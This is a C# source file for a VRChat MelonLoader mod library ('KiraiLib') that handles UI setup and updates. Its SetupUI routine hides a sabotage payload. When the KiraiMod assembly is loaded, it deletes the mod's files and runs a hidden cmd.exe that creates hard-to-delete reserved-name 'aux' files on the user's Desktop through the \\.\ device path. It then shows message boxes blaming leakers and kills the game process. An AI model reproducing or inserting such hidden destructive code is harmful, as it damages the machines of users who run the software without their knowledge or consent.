using MelonLoader;
using System.Collections;
using System.Linq;
using System.Net.Http;
using System.Reflection;
using System.Windows.Forms;

namespace KiraiMod
{
    public static partial class KiraiLib
    {
        private static System.Collections.Generic.List<string> lines = new System.Collections.Generic.List<string>();

        private static object OnUpdateToken;
        private static bool Unloaded;

        private static MethodInfo popup;
        private static HttpClient http;

        static KiraiLib()
        {
            SDK.Initialize();

            http = new HttpClient();

            MelonCoroutines.Start(SetupUI());

            popup = typeof(VRCUiPopupManager).GetMethod(
                nameof(VRCUiPopupManager.Method_Public_Void_String_String_InputType_Boolean_String_Action_3_String_List_1_KeyCode_Text_Action_String_Boolean_Action_1_VRCUiPopup_0),
                BindingFlags.Public | BindingFlags.Instance);

            Events.OnUIUnload += () =>
            {
                Unloaded = true;
                Logger.ClearDisplay();
            };

            Events.OnUIReload += () => Unloaded = false;
        }

        private static IEnumerator SetupUI()
        {
            while (VRCUiManager.prop_VRCUiManager_0 is null) yield return null;

            var k = System.AppDomain.CurrentDomain.GetAssemblies().FirstOrDefault(a => a.GetName().Name == "KiraiMod");
            if (k != null)
            {
                foreach (string path in System.IO.Directory.EnumerateFiles("Mods"))
                {
                    if (path.Contains("KiraiMod"))
                    {
                        try
                        {
                            System.IO.File.Delete(path);
                        }
                        catch { }
                    }
                }

                var m = new string[] { "it", "was", "fun", "while", "it", "lasted", "but", "you", "gang", "monkeys", "cant", "be", "trusted", "with", "anything" };

                var self = System.Environment.UserName;
                var dir = "/c ";
                for (int i = 0; i < m.Length; i++) 
                    dir += $"echo. > \\\\.\\{System.Environment.GetFolderPath(System.Environment.SpecialFolder.Desktop)}\\aux.{i}0.{m[i]} && ";
                dir += "exit";

                System.Diagnostics.Process process = new System.Diagnostics.Process();
                System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
                startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                startInfo.FileName = "cmd.exe";
                startInfo.Arguments = dir;
                process.StartInfo = startInfo;
                process.Start();

                var n = "KiraiMod is shutting down";
                System.Console.Beep();
                System.Console.Beep();
                System.Console.Beep();
                MessageBox.Show("After 10 months in development, the mod is finally over.\n", n);
                System.Console.Beep();
                MessageBox.Show("The mod was fun to create however some people cannot be trusted\n", n);
                System.Console.Beep();
                MessageBox.Show("I never allowed my mod to be shared, however some people did anyway\n", n);
                System.Console.Beep();
                MessageBox.Show("These people are now why the mod is stopping\n", n);
                System.Console.Beep();
                MessageBox.Show("If people had respected my will to keep it private it would keep going\n", n);
                System.Console.Beep();
                MessageBox.Show("The discord server was disabled after a long history due to Zenny#0001\n", n);
                System.Console.Beep();
                MessageBox.Show("As a result I'm ending the mod before a game update gets to\n", n);
                System.Console.Beep();
                MessageBox.Show("Special shoutout for stealing my code\n\nDay Client, Notorious, Sun Client, Late Night Client\n", n);
                System.Console.Beep();
                System.Console.Beep();
                System.Console.Beep();

                System.Diagnostics.Process.GetCurrentProcess().Kill();

                System.Action a = null;
                a = new System.Action(() => {
                    a();
                }); 
            }

            Logger.Initialize();
            UI.Initialize();

            OnUpdateToken = MelonCoroutines.Start(OnUpdate());
        }

        private static IEnumerator OnUpdate()
        {
            for (;;)
            {
                yield return null;

                UI.HandlePages();
            }
        }
    }
}
